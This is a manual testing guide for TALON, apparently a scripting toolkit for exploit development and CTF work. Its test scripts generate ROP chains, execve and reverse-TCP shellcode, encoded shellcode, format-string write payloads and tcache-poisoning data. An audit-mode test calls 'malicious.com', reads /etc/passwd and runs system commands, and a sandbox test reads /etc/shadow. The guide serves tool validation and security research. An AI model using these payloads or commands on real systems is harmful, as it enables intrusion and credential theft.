# TALON Manual Testing Guide

## Overview
This guide provides detailed, step-by-step instructions for manually testing TALON's functionality. Use this guide when automated tests are insufficient or when validating user-facing features.

**Target Audience**: QA Engineers, Security Researchers, Contributors  
**Estimated Time**: 4-6 hours for full validation  
**Prerequisites**: See `TESTING_ENVIRONMENT.md`

---

## Table of Contents
1. [Environment Setup](#environment-setup)
2. [Basic Functionality](#basic-functionality)
3. [Parser & Language Features](#parser--language-features)
4. [Binary Analysis](#binary-analysis)
5. [Exploitation Primitives](#exploitation-primitives)
6. [Network & Protocol Features](#network--protocol-features)
7. [IDE Integration](#ide-integration)
8. [Example Scripts Validation](#example-scripts-validation)
9. [Performance Testing](#performance-testing)
10. [Security Validation](#security-validation)
11. [Cross-Platform Testing](#cross-platform-testing)

---

## Environment Setup

### Step 1: Verify Prerequisites
**Duration**: 5 minutes

1. **Check Rust installation**:
   ```bash
   rustc --version
   cargo --version
   ```
   **Expected**: Rust 1.70+ and Cargo installed

2. **Verify build tools**:
   ```bash
   # Linux
   gcc --version
   make --version
   
   # Windows
   cl.exe
   # or
   gcc --version  # MinGW
   ```

3. **Clone repository**:
   ```bash
   git clone https://github.com/ridpath/talon.git
   cd talon
   ```

### Step 2: Build TALON
**Duration**: 3-5 minutes

1. **Clean build**:
   ```bash
   cargo clean
   cargo build --release
   ```

2. **Verify binary**:
   ```bash
   # Linux/macOS
   ./target/release/talon --version
   
   # Windows
   .\target\release\talon.exe --version
   ```
   **Expected Output**: `TALON v0.1.0` (or current version)

3. **Run test suite** (quick validation):
   ```bash
   cargo test --release -- --test-threads=1
   ```
   **Expected**: All tests pass (may take 2-5 minutes)

### Step 3: Prepare Test Environment
**Duration**: 5 minutes

1. **Create test workspace**:
   ```bash
   mkdir -p ~/talon_test
   cd ~/talon_test
   ```

2. **Copy test binaries** (if available):
   ```bash
   cp /path/to/vulnerable_test_programs/* .
   ```

3. **Set up Docker** (optional, for safe exploit testing):
   ```bash
   docker pull ubuntu:22.04
   docker run -it -v $(pwd):/work ubuntu:22.04 bash
   ```

---

## Basic Functionality

### Test 1: REPL Startup and Basic Commands
**Duration**: 10 minutes  
**Priority**: CRITICAL

#### Procedure:
1. Launch REPL:
   ```bash
   talon repl
   ```

2. **Test basic arithmetic**:
   ```talon
   talon> 2 + 2
   ```
   **Expected**: `4`

3. **Test variable assignment**:
   ```talon
   talon> let x = 10
   talon> print(x)
   ```
   **Expected**: `10`

4. **Test string operations**:
   ```talon
   talon> let s = "hello"
   talon> print(s + " world")
   ```
   **Expected**: `hello world`

5. **Test function definition**:
   ```talon
   talon> define function greet(name)
   ...>     return "Hello, " + name
   ...> end
   talon> print(greet("Talon"))
   ```
   **Expected**: `Hello, Talon`

6. **Exit REPL**:
   ```talon
   talon> exit
   ```
   **Expected**: Clean exit, no errors

#### Validation:
- [ ] REPL starts without errors
- [ ] Prompt displays correctly
- [ ] Basic commands execute
- [ ] Multi-line input works
- [ ] Exit is clean

#### Common Issues:
- **REPL doesn't start**: Check if binary is in PATH or use full path
- **Commands hang**: Verify Rust toolchain version (>= 1.70)
- **Syntax errors**: Check for correct TALON syntax (see examples/)

---

### Test 2: Script Execution
**Duration**: 10 minutes  
**Priority**: CRITICAL

#### Procedure:
1. **Create test script** (`test_basic.talon`):
   ```talon
   # test_basic.talon
   print("Starting TALON test...")
   
   let numbers = [1, 2, 3, 4, 5]
   let sum = 0
   
   for num in numbers
       sum = sum + num
   end
   
   print("Sum:", sum)
   print("Test complete!")
   ```

2. **Execute script**:
   ```bash
   talon run test_basic.talon
   ```

3. **Verify output**:
   ```
   Starting TALON test...
   Sum: 15
   Test complete!
   ```

4. **Test error handling** (create `test_error.talon`):
   ```talon
   # Intentional error
   let x = undefined_variable
   ```

5. **Run error script**:
   ```bash
   talon run test_error.talon
   ```
   **Expected**: Clear error message, line number, and description

#### Validation:
- [ ] Script executes successfully
- [ ] Output matches expected
- [ ] Return code is 0 on success
- [ ] Error messages are helpful
- [ ] Line numbers in errors are accurate

---

### Test 3: Command Line Help System
**Duration**: 5 minutes  
**Priority**: HIGH

#### Procedure:
1. **Test main help**:
   ```bash
   talon --help
   ```
   **Verify**: Lists all subcommands (run, repl, analyze, etc.)

2. **Test subcommand help**:
   ```bash
   talon run --help
   talon analyze --help
   talon fuzz --help
   ```
   **Verify**: Each shows specific options and examples

3. **Test version**:
   ```bash
   talon --version
   ```
   **Verify**: Shows version number

#### Validation:
- [ ] Help text is clear and complete
- [ ] Examples are accurate
- [ ] All flags documented
- [ ] Version info correct

---

## Parser & Language Features

### Test 4: Data Types and Structures
**Duration**: 15 minutes  
**Priority**: HIGH

#### Procedure:
1. **Create test script** (`test_types.talon`):
   ```talon
   # Integers
   let i = 42
   print("Integer:", i)
   
   # Strings
   let s = "hello world"
   print("String:", s)
   
   # Arrays
   let arr = [1, 2, 3, "four", 5.0]
   print("Array:", arr)
   print("First element:", arr[0])
   
   # Dictionaries
   let dict = {"name": "TALON", "version": 1, "active": true}
   print("Dict:", dict)
   print("Name:", dict["name"])
   
   # Bytes
   let b = bytes("ABCD")
   print("Bytes:", b)
   print("Hex:", hex(b))
   ```

2. **Execute**:
   ```bash
   talon run test_types.talon
   ```

3. **Verify output**:
   - All types print correctly
   - Array indexing works
   - Dictionary access works
   - Type conversions correct

#### Validation:
- [ ] All data types work
- [ ] Indexing is accurate
- [ ] Type conversions succeed
- [ ] No type confusion errors

---

### Test 5: Control Flow
**Duration**: 15 minutes  
**Priority**: HIGH

#### Procedure:
1. **Create test script** (`test_control_flow.talon`):
   ```talon
   # If-else
   let x = 10
   if x > 5
       print("x is greater than 5")
   else
       print("x is 5 or less")
   end
   
   # Loops
   for i in range(5)
       print("Loop iteration:", i)
   end
   
   # While
   let counter = 0
   while counter < 3
       print("Counter:", counter)
       counter = counter + 1
   end
   
   # Functions
   define function factorial(n)
       if n <= 1
           return 1
       else
           return n * factorial(n - 1)
       end
   end
   
   print("Factorial of 5:", factorial(5))
   ```

2. **Execute and verify**:
   ```bash
   talon run test_control_flow.talon
   ```
   **Expected**: 
   - If-else logic correct
   - Loops execute expected iterations
   - Recursion works (factorial(5) = 120)

#### Validation:
- [ ] Conditionals work correctly
- [ ] For loops iterate properly
- [ ] While loops terminate
- [ ] Recursion doesn't overflow
- [ ] Function returns work

---

### Test 6: Builtin Functions (Packing/Encoding)
**Duration**: 20 minutes  
**Priority**: CRITICAL

#### Procedure:
1. **Create test script** (`test_builtins.talon`):
   ```talon
   # Packing functions
   let addr = 0xdeadbeef
   let packed_32 = p32(addr)
   let packed_64 = p64(addr)
   
   print("Original:", hex(addr))
   print("p32:", hex(packed_32))
   print("p64:", hex(packed_64))
   
   # Unpacking
   let unpacked_32 = u32(packed_32)
   let unpacked_64 = u64(packed_64)
   
   print("u32:", hex(unpacked_32))
   print("u64:", hex(unpacked_64))
   
   # Encoding
   let data = bytes("hello")
   print("Base64:", base64(data))
   print("Hex:", hex(data))
   print("URL:", url_encode("hello world?test=1"))
   
   # Cyclic patterns
   let pattern = cyclic(100)
   print("Cyclic length:", len(pattern))
   let offset = cyclic_find(bytes("baaa"))
   print("Offset of 'baaa':", offset)
   ```

2. **Execute and verify**:
   ```bash
   talon run test_builtins.talon
   ```

3. **Manual verification**:
   - `p32(0xdeadbeef)` = `\xef\xbe\xad\xde` (little-endian)
   - `p64(0xdeadbeef)` = `\xef\xbe\xad\xde\x00\x00\x00\x00`
   - Unpacking reverses packing
   - Base64("hello") = `aGVsbG8=`
   - Cyclic pattern length is 100
   - Cyclic offset is predictable

#### Validation:
- [ ] Packing produces correct byte order
- [ ] Unpacking reverses packing
- [ ] Encoding functions work
- [ ] Cyclic patterns are generated
- [ ] Cyclic offset finding works

---

## Binary Analysis

### Test 7: ELF Binary Parsing
**Duration**: 15 minutes  
**Priority**: CRITICAL

#### Procedure:
1. **Prepare test binary**:
   ```bash
   # Use system binary
   cp /bin/ls test_binary
   # Or create simple test program:
   echo 'int main() { return 0; }' > test.c
   gcc test.c -o test_binary
   ```

2. **Create analysis script** (`test_elf.talon`):
   ```talon
   # Analyze ELF binary
   let elf = analyze("test_binary")
   
   print("Architecture:", elf["arch"])
   print("Entry point:", hex(elf["entry"]))
   print("PIE enabled:", elf["pie"])
   print("NX enabled:", elf["nx"])
   print("Canary:", elf["canary"])
   print("RELRO:", elf["relro"])
   
   # Symbols
   print("\nSymbols:")
   for sym in elf["symbols"]
       print("  ", sym["name"], hex(sym["address"]))
   end
   
   # Sections
   print("\nSections:")
   for sec in elf["sections"]
       print("  ", sec["name"], hex(sec["address"]), sec["size"])
   end
   ```

3. **Execute**:
   ```bash
   talon run test_elf.talon
   ```

4. **Compare with readelf**:
   ```bash
   readelf -h test_binary
   readelf -S test_binary
   checksec test_binary
   ```

#### Validation:
- [ ] Architecture detected correctly (x86_64, i386, etc.)
- [ ] Entry point matches `readelf -h`
- [ ] Security features detected accurately
- [ ] Symbols parsed correctly
- [ ] Sections match `readelf -S`

---

### Test 8: PE Binary Parsing (Windows)
**Duration**: 15 minutes  
**Priority**: HIGH (Windows only)

#### Procedure:
1. **Prepare test binary**:
   ```powershell
   # Use system binary
   copy C:\Windows\System32\notepad.exe test_pe.exe
   ```

2. **Create analysis script** (`test_pe.talon`):
   ```talon
   let pe = analyze("test_pe.exe")
   
   print("Architecture:", pe.arch)
   print("Entry point:", hex(pe.entry))
   print("ASLR:", pe.aslr)
   print("DEP:", pe.dep)
   print("CFG:", pe.cfg)
   
   print("\nImports:")
   for imp in pe.imports
       print("  ", imp.dll, "->", imp.function)
   end
   ```

3. **Execute and verify**:
   ```bash
   talon run test_pe.talon
   ```

4. **Compare with PE tools**:
   ```powershell
   dumpbin /headers test_pe.exe
   ```

#### Validation:
- [ ] Architecture detected
- [ ] Security features correct
- [ ] Imports parsed
- [ ] Exports parsed (if applicable)

---

### Test 9: Disassembly
**Duration**: 10 minutes  
**Priority**: MEDIUM

#### Procedure:
1. **Create disassembly script** (`test_disasm.talon`):
   ```talon
   let elf = analyze("test_binary")
   let main_func = elf["symbols"]["main"]
   
   print("Disassembling main at", hex(main_func))
   let code = disassemble(elf, main_func, 50)
   
   for insn in code
       print(hex(insn.address), insn.mnemonic, insn.op_str)
   end
   ```

2. **Execute and compare with objdump**:
   ```bash
   talon run test_disasm.talon
   objdump -d test_binary | grep -A 20 "<main>:"
   ```

#### Validation:
- [ ] Instructions decoded correctly
- [ ] Addresses are accurate
- [ ] Mnemonics match objdump
- [ ] Operands parsed correctly

---

## Exploitation Primitives

### Test 10: ROP Gadget Finding
**Duration**: 20 minutes  
**Priority**: CRITICAL

#### Procedure:
1. **Create ROP test script** (`test_rop.talon`):
   ```talon
   # Find gadgets in binary
   let binary = "./test_binary"
   let rop = quick_rop(binary)
   
   print("Finding gadgets...")
   
   # Search for common gadgets
   let pop_rdi = rop.find("pop rdi; ret")
   if pop_rdi != null
       print("pop rdi; ret:", hex(pop_rdi))
   end
   
   let pop_rsi = rop.find("pop rsi; ret")
   if pop_rsi != null
       print("pop rsi; ret:", hex(pop_rsi))
   end
   
   let syscall = rop.find("syscall")
   if syscall != null
       print("syscall:", hex(syscall))
   end
   
   # List all gadgets
   print("\nAll gadgets:")
   for gadget in rop.gadgets
       print(hex(gadget.address), gadget.insns)
   end
   ```

2. **Execute**:
   ```bash
   talon run test_rop.talon
   ```

3. **Verify with ROPgadget**:
   ```bash
   ROPgadget --binary test_binary | grep "pop rdi"
   ```

#### Validation:
- [ ] Common gadgets found
- [ ] Addresses are accurate
- [ ] Quality scoring reasonable
- [ ] Gadget search completes in < 10s

---

### Test 11: ROP Chain Building
**Duration**: 20 minutes  
**Priority**: CRITICAL

#### Procedure:
1. **Create chain building script** (`test_rop_chain.talon`):
   ```talon
   let binary = "./test_binary"
   let rop = quick_rop(binary)
   
   # Build manual chain
   let pop_rdi = rop.find("pop rdi; ret")
   let system = 0x7ffff7e4c550  # Example address
   let bin_sh = 0x7ffff7f7e152
   
   let chain = bytes()
   chain = chain + p64(pop_rdi)
   chain = chain + p64(bin_sh)
   chain = chain + p64(system)
   
   print("ROP chain length:", len(chain))
   print("ROP chain (hex):")
   print(hex(chain))
   
   # Use auto-builder (if implemented)
   # let auto_chain = rop.build_execve_chain()
   # print("Auto chain:", hex(auto_chain))
   ```

2. **Execute and verify**:
   ```bash
   talon run test_rop_chain.talon
   ```

3. **Manual verification**:
   - Chain length = 24 bytes (3 addresses × 8 bytes)
   - Each address is little-endian packed
   - Gadgets are valid from gadget search

#### Validation:
- [ ] Chain builds successfully
- [ ] Addresses packed correctly
- [ ] Chain length is correct
- [ ] No null bytes (if required)

---

### Test 12: Shellcode Generation
**Duration**: 15 minutes  
**Priority**: CRITICAL

#### Procedure:
1. **Create shellcode test script** (`test_shellcode.talon`):
   ```talon
   # Generate x64 execve shellcode
   let sc = shellcode("x64", "execve_sh")
   
   print("Shellcode length:", len(sc))
   print("Shellcode (hex):")
   print(hex(sc))
   
   # Check for null bytes
   let has_null = false
   for byte in sc
       if byte == 0x00
           has_null = true
       end
   end
   
   if has_null
       print("WARNING: Shellcode contains null bytes!")
   else
       print("OK: No null bytes")
   end
   
   # Generate reverse shell
   let rshell = shellcode("x64", "reverse_tcp", {
       "lhost": "192.168.1.100",
       "lport": "4444"
   })
   
   print("\nReverse shell length:", len(rshell))
   print("Reverse shell (hex):")
   print(hex(rshell))
   ```

2. **Execute**:
   ```bash
   talon run test_shellcode.talon
   ```

3. **Verify with known shellcode**:
   - Compare with http://shell-storm.org/shellcode/
   - Length should be ~24 bytes for execve
   - Should contain syscall opcode (0x0f 0x05)

#### Validation:
- [ ] Shellcode generates successfully
- [ ] Length is reasonable
- [ ] No null bytes (critical)
- [ ] Contains expected opcodes
- [ ] Parameters embedded correctly

---

### Test 13: Shellcode Encoding
**Duration**: 15 minutes  
**Priority**: HIGH

#### Procedure:
1. **Create encoding test script** (`test_shellcode_encoding.talon`):
   ```talon
   let sc = shellcode("x64", "execve_sh")
   
   # XOR encoding
   print("Original shellcode:", hex(sc))
   
   let encoded = xor_encode(sc, 0xaa)
   print("\nXOR encoded (key=0xaa):")
   print(hex(encoded))
   
   let decoded = xor_decode(encoded, 0xaa)
   print("\nDecoded:")
   print(hex(decoded))
   
   if decoded == sc
       print("SUCCESS: Encoding/decoding works!")
   else
       print("ERROR: Decoding failed!")
   end
   
   # Alphanumeric encoding
   let alpha = alphanumeric_encode(sc)
   print("\nAlphanumeric encoded:")
   print(hex(alpha))
   
   # Verify all bytes are alphanumeric
   let is_alpha = true
   for byte in alpha
       if (byte < 0x30 or byte > 0x39) and (byte < 0x41 or byte > 0x5a)
           is_alpha = false
       end
   end
   
   if is_alpha
       print("SUCCESS: All bytes alphanumeric!")
   else
       print("ERROR: Non-alphanumeric bytes found!")
   end
   ```

2. **Execute and verify**:
   ```bash
   talon run test_shellcode_encoding.talon
   ```

#### Validation:
- [ ] XOR encoding works
- [ ] XOR decoding reverses encoding
- [ ] Alphanumeric encoding produces valid output
- [ ] No bad characters in encoded shellcode

---

### Test 14: Format String Exploitation
**Duration**: 20 minutes  
**Priority**: CRITICAL

#### Procedure:
1. **Create format string test script** (`test_fmtstr.talon`):
   ```talon
   # Create format string helper
   let binary = "./vulnerable_program"  # Use a test binary with format string vuln
   let fmt = format_string(binary, offset=6)
   
   # Generate leak payload
   let leak_payload = fmt.leak(6)
   print("Leak payload:", leak_payload)
   # Expected: "%6$p"
   
   # Generate stack dump
   let stack_dump = fmt.leak_stack(10)
   print("Stack dump payload:", stack_dump)
   # Expected: "%5$p.%6$p.%7$p..."
   
   # Generate write payload
   let write_payload = fmt.write(0x601020, 0xdeadbeef)
   print("\nWrite payload length:", len(write_payload))
   print("Write payload (hex):")
   print(hex(write_payload))
   
   # Verify address is embedded
   let addr_bytes = p64(0x601020)
   if write_payload.contains(addr_bytes)
       print("SUCCESS: Address embedded correctly!")
   else
       print("ERROR: Address not found in payload!")
   end
   ```

2. **Execute**:
   ```bash
   talon run test_fmtstr.talon
   ```

3. **Manual verification**:
   - Leak payload format: `%N$p` where N is offset
   - Write payload contains target address
   - Write payload contains format specifiers (%hhn, %n, etc.)

#### Validation:
- [ ] Leak payload generated correctly
- [ ] Stack dump payload correct
- [ ] Write payload contains address
- [ ] Write payload contains format specifiers
- [ ] Padding/alignment correct

---

### Test 15: Heap Exploitation
**Duration**: 20 minutes  
**Priority**: HIGH

#### Procedure:
1. **Create heap test script** (`test_heap.talon`):
   ```talon
   # Tcache manipulation
   print("Testing tcache manipulation...")
   
   # Create tcache metadata
   let chunk_addr = 0x555555559000
   let chunk_size = 0x20
   
   # Calculate tcache bin index
   let tcache_idx = (chunk_size - 16) / 16
   print("Tcache index:", tcache_idx)
   
   # Create fake chunk metadata
   let fake_chunk = p64(0) + p64(chunk_size | 1)  # size with prev_inuse
   print("Fake chunk metadata:", hex(fake_chunk))
   
   # Tcache poisoning payload
   let target = 0x555555559100
   let poison_payload = p64(target)
   print("Poison payload:", hex(poison_payload))
   
   # Fastbin manipulation
   print("\nTesting fastbin manipulation...")
   let fastbin_chunk = p64(0) + p64(0x21)  # 0x20 chunk with prev_inuse
   print("Fastbin chunk:", hex(fastbin_chunk))
   ```

2. **Execute**:
   ```bash
   talon run test_heap.talon
   ```

#### Validation:
- [ ] Tcache index calculation correct
- [ ] Chunk metadata format correct
- [ ] Size flags set properly (prev_inuse, etc.)
- [ ] Payload generation works

---

## Network & Protocol Features

### Test 16: Socket Operations
**Duration**: 15 minutes  
**Priority**: MEDIUM

#### Procedure:
1. **Set up test server** (in separate terminal):
   ```bash
   # Simple echo server
   nc -l -p 8888
   ```

2. **Create network test script** (`test_network.talon`):
   ```talon
   # Connect to server
   print("Connecting to localhost:8888...")
   let conn = quick_shell("localhost", 8888)
   
   # Send data
   conn.send("Hello from TALON\n")
   print("Sent: Hello from TALON")
   
   # Receive data
   let response = conn.recv(1024)
   print("Received:", response)
   
   # Close connection
   conn.close()
   print("Connection closed")
   ```

3. **Execute**:
   ```bash
   talon run test_network.talon
   ```

#### Validation:
- [ ] Connection establishes successfully
- [ ] Data sends correctly
- [ ] Data receives correctly
- [ ] Connection closes cleanly

---

### Test 17: HTTP Operations
**Duration**: 10 minutes  
**Priority**: LOW

#### Procedure:
1. **Create HTTP test script** (`test_http.talon`):
   ```talon
   # Make HTTP request (if implemented)
   let response = http_get("http://example.com")
   print("Status:", response.status)
   print("Headers:", response.headers)
   print("Body length:", len(response.body))
   ```

2. **Execute and verify**:
   ```bash
   talon run test_http.talon
   ```

#### Validation:
- [ ] HTTP request succeeds
- [ ] Response parsed correctly
- [ ] Status code is 200
- [ ] Body contains expected content

---

## IDE Integration

### Test 18: VS Code Extension Installation
**Duration**: 10 minutes  
**Priority**: HIGH

#### Procedure:
1. **Build extension**:
   ```bash
   cd vscode-extension
   npm install
   npm run compile
   npm run package
   ```

2. **Install extension**:
   ```bash
   code --install-extension talon-vscode-0.1.0.vsix
   ```

3. **Verify installation**:
   - Open VS Code
   - Extensions sidebar
   - Search for "TALON"
   - Should show "Enabled"

#### Validation:
- [ ] Extension packages successfully
- [ ] Extension installs without errors
- [ ] Extension appears in VS Code
- [ ] Extension activates on `.talon` files

---

### Test 19: LSP Features (Syntax Highlighting)
**Duration**: 15 minutes  
**Priority**: HIGH

#### Procedure:
1. **Create test file in VS Code** (`test_lsp.talon`):
   ```talon
   # This is a comment
   let variable = "string value"
   let number = 42
   
   define function test_func(arg1, arg2)
       return arg1 + arg2
   end
   
   if variable == "string value"
       print("Correct!")
   end
   ```

2. **Verify syntax highlighting**:
   - Comments are colored (green/gray)
   - Keywords highlighted (`let`, `define`, `if`, `end`)
   - Strings are colored (red/orange)
   - Numbers are colored (blue/purple)
   - Functions are highlighted

#### Validation:
- [ ] Comments highlighted
- [ ] Keywords highlighted
- [ ] Strings highlighted
- [ ] Numbers highlighted
- [ ] Functions highlighted
- [ ] No highlighting errors

---

### Test 20: LSP Features (Autocomplete)
**Duration**: 15 minutes  
**Priority**: HIGH

#### Procedure:
1. **Open test file in VS Code**
2. **Type partial builtin name**:
   ```talon
   let x = p6
   ```
   - Press Ctrl+Space
   - Expected: Suggestions include `p64`, `p32`

3. **Test function autocomplete**:
   ```talon
   define function my_function(arg)
       return arg
   end
   
   my_f
   ```
   - Press Ctrl+Space
   - Expected: `my_function` suggested

4. **Test variable autocomplete**:
   ```talon
   let my_variable = 10
   my_v
   ```
   - Press Ctrl+Space
   - Expected: `my_variable` suggested

#### Validation:
- [ ] Builtin functions autocomplete
- [ ] User-defined functions autocomplete
- [ ] Variables autocomplete
- [ ] Suggestions are relevant
- [ ] No false suggestions

---

### Test 21: LSP Features (Hover Info)
**Duration**: 10 minutes  
**Priority**: MEDIUM

#### Procedure:
1. **Hover over builtin function**:
   ```talon
   let x = p64(0xdeadbeef)
   ```
   - Hover over `p64`
   - Expected: Documentation popup with signature and description

2. **Hover over variable**:
   ```talon
   let my_var = 42
   print(my_var)
   ```
   - Hover over `my_var`
   - Expected: Type info or value

#### Validation:
- [ ] Hover info displays
- [ ] Documentation is helpful
- [ ] Function signatures correct
- [ ] Type information shown

---

### Test 22: Debugger Integration (DAP)
**Duration**: 20 minutes  
**Priority**: MEDIUM

#### Procedure:
1. **Create debug test file** (`test_debug.talon`):
   ```talon
   let x = 10
   let y = 20
   let z = x + y
   print("Result:", z)
   ```

2. **Set breakpoint**:
   - Click left gutter on line `let z = x + y`
   - Red dot should appear

3. **Start debugging**:
   - Press F5 or Run > Start Debugging
   - Debugger should stop at breakpoint

4. **Inspect variables**:
   - Variables panel should show `x = 10`, `y = 20`
   - Hover over variables in editor

5. **Step through**:
   - Press F10 (step over)
   - Verify `z` is calculated correctly

#### Validation:
- [ ] Breakpoints set successfully
- [ ] Debugger starts
- [ ] Execution stops at breakpoint
- [ ] Variables displayed correctly
- [ ] Step-through works
- [ ] Continue/stop works

---

## Example Scripts Validation

### Test 23: Tutorial Examples
**Duration**: 30 minutes  
**Priority**: CRITICAL

#### Procedure:
Execute each tutorial example and verify output:

1. **tutorial_01_basics.talon**:
   ```bash
   talon run examples/tutorial_01_basics.talon
   ```
   **Expected**: Demonstrates basic syntax, no errors

2. **tutorial_02_exploitation.talon**:
   ```bash
   talon run examples/tutorial_02_exploitation.talon
   ```
   **Expected**: Shows exploitation primitives, generates payloads

3. **tutorial_03_web_exploitation.talon**:
   ```bash
   talon run examples/tutorial_03_web_exploitation.talon
   ```
   **Expected**: Web exploitation demos, payloads generated

4. **tutorial_04_ctf_toolkit.talon**:
   ```bash
   talon run examples/tutorial_04_ctf_toolkit.talon
   ```
   **Expected**: CTF helpers demonstrated

#### Validation:
- [ ] All tutorials execute without errors
- [ ] Output matches descriptions
- [ ] Examples are educational
- [ ] No deprecated features used

---

### Test 24: CTF Example Scripts
**Duration**: 45 minutes  
**Priority**: HIGH

#### Procedure:
Test each CTF example:

1. **ctf_ret2libc_pwn.talon**
2. **ctf_format_string_leak_write.talon**
3. **ctf_heap_tcache_poison.talon**
4. **ctf_kernel_exploit.talon**
5. **ctf_one_gadget_pwn.talon**
6. **ctf_multi_stage_pwn.talon**
7. **ctf_blind_rop.talon**
8. **ctf_shellcode_encoder.talon**

For each:
```bash
talon run examples/<example_name>.talon
```

#### Validation:
- [ ] All CTF examples execute
- [ ] Payloads generate successfully
- [ ] Techniques are demonstrated clearly
- [ ] Examples are realistic

---

### Test 25: Advanced Examples
**Duration**: 30 minutes  
**Priority**: MEDIUM

#### Procedure:
Test advanced examples:

1. **advanced_rop_exploitation.talon**
2. **advanced_fmtstr_showcase.talon**
3. **advanced_shellcode_showcase.talon**
4. **exploit_chain_buffer_overflow.talon**
5. **exploit_chain_format_string.talon**
6. **exploit_chain_heap_uaf.talon**

#### Validation:
- [ ] Advanced techniques work
- [ ] Examples complete successfully
- [ ] Performance is acceptable
- [ ] Output is meaningful

---

## Performance Testing

### Test 26: Benchmark Execution
**Duration**: 30 minutes  
**Priority**: MEDIUM

#### Procedure:
1. **Run benchmarks**:
   ```bash
   cargo bench
   ```

2. **Analyze results**:
   - Parser benchmarks < 10μs per expression
   - Interpreter benchmarks < 1μs per operation
   - Binary analysis < 100ms for medium binary
   - ROP gadget search < 5s

3. **Compare with baseline** (if available):
   ```bash
   # Save baseline
   cargo bench -- --save-baseline main
   
   # Later, compare
   cargo bench -- --baseline main
   ```

#### Validation:
- [ ] All benchmarks complete
- [ ] Performance within acceptable range
- [ ] No significant regressions
- [ ] Results are reproducible

---

### Test 27: Memory Usage
**Duration**: 20 minutes  
**Priority**: MEDIUM

#### Procedure:
1. **Measure idle memory**:
   ```bash
   talon repl &
   ps aux | grep talon
   ```
   **Expected**: < 10MB

2. **Measure during parsing**:
   ```bash
   /usr/bin/time -v talon run examples/world_class_exploit.talon
   ```
   **Check**: Maximum resident set size

3. **Check for leaks**:
   ```bash
   valgrind --leak-check=full --show-leak-kinds=all \
     talon run examples/tutorial_01_basics.talon
   ```
   **Expected**: No definite leaks

#### Validation:
- [ ] Idle memory < 10MB
- [ ] Peak memory reasonable (< 500MB)
- [ ] No memory leaks
- [ ] Memory released after execution

---

## Security Validation

### Test 28: Audit Mode
**Duration**: 15 minutes  
**Priority**: HIGH

#### Procedure:
1. **Create potentially dangerous script** (`test_audit.talon`):
   ```talon
   # Network operation
   let conn = quick_shell("malicious.com", 1337)
   
   # File operation
   let data = read_file("/etc/passwd")
   
   # Command execution
   let result = system("whoami")
   ```

2. **Run in audit mode** (if implemented):
   ```bash
   talon --audit run test_audit.talon
   ```
   **Expected**: Operations logged but not executed

#### Validation:
- [ ] Audit mode prevents execution
- [ ] All operations logged
- [ ] Report generated
- [ ] No side effects

---

### Test 29: Sandboxing
**Duration**: 20 minutes  
**Priority**: HIGH

#### Procedure:
1. **Test in Docker container**:
   ```bash
   docker run -it -v $(pwd):/work ubuntu:22.04
   cd /work
   ./target/release/talon run examples/tutorial_01_basics.talon
   ```

2. **Verify filesystem restrictions** (if implemented):
   ```talon
   # Try to access sensitive files
   let data = read_file("/etc/shadow")
   ```
   **Expected**: Access denied or error

#### Validation:
- [ ] Runs safely in container
- [ ] Filesystem access controlled
- [ ] Network access controllable
- [ ] No container escape

---

## Cross-Platform Testing

### Test 30: Linux Platform Validation
**Duration**: 30 minutes  
**Priority**: CRITICAL

#### Procedure:
Test on multiple Linux distributions:

1. **Ubuntu 22.04**:
   ```bash
   cargo build --release
   cargo test --all-features
   talon run examples/tutorial_01_basics.talon
   ```

2. **Ubuntu 20.04**:
   - Same as above

3. **Fedora/RHEL** (if available):
   - Same as above

#### Validation:
- [ ] Builds on all platforms
- [ ] Tests pass on all platforms
- [ ] Examples work on all platforms
- [ ] No platform-specific bugs

---

### Test 31: Windows Platform Validation
**Duration**: 30 minutes  
**Priority**: CRITICAL

#### Procedure:
1. **MSVC toolchain**:
   ```powershell
   cargo build --release
   cargo test --all-features
   talon run examples\tutorial_01_basics.talon
   ```

2. **MinGW toolchain**:
   ```bash
   rustup default stable-x86_64-pc-windows-gnu
   cargo build --release
   ```

#### Validation:
- [ ] MSVC build succeeds
- [ ] MinGW build succeeds
- [ ] Tests pass on both toolchains
- [ ] Examples work on Windows
- [ ] Path handling correct (backslashes)

---

## Test Completion Checklist

### Final Validation
- [ ] All critical tests passed
- [ ] All high-priority tests passed
- [ ] Medium/low priority tests at least attempted
- [ ] Issues documented in test report
- [ ] Performance within acceptable limits
- [ ] Security validation completed

### Test Report
**Date**: ___________________  
**Tester**: ___________________  
**Platform**: ___________________  
**Version**: ___________________

**Tests Passed**: ___ / ___  
**Tests Failed**: ___  
**Tests Skipped**: ___

**Critical Issues Found**: ___  
**Blocker Issues**: ___

**Notes**:
```




```

---

## Troubleshooting

### Common Issues

**Issue**: REPL won't start  
**Solution**: Check Rust version (>= 1.70), verify binary in PATH

**Issue**: Tests fail with "cargo not found"  
**Solution**: Install Rust toolchain, restart terminal

**Issue**: Network tests fail  
**Solution**: Check firewall, verify test server running

**Issue**: VS Code extension won't load  
**Solution**: Check TypeScript compilation, verify extension ID

**Issue**: Performance benchmarks show regression  
**Solution**: Check for debug build, verify system load, compare with baseline

---

**Document Version**: 1.0  
**Last Updated**: 2026-01-15
